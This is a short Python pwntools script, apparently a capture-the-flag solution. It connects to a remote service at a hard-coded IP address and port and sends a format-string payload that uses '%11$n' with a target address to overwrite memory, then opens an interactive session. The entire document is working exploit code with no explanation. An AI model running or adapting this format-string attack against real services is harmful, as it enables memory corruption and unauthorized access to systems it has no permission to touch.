from pwn import *

io = remote('111.200.241.244', 59098)
# io = process('./pwn')
io.recv()
payload1 = b'DEADBEE\x00'
io.send(payload1)
io.recv()
payload2 = p32(0xdeadbeef) + p32(0x804a068) + b'%11$n\x00'
io.send(payload2)
io.interactive()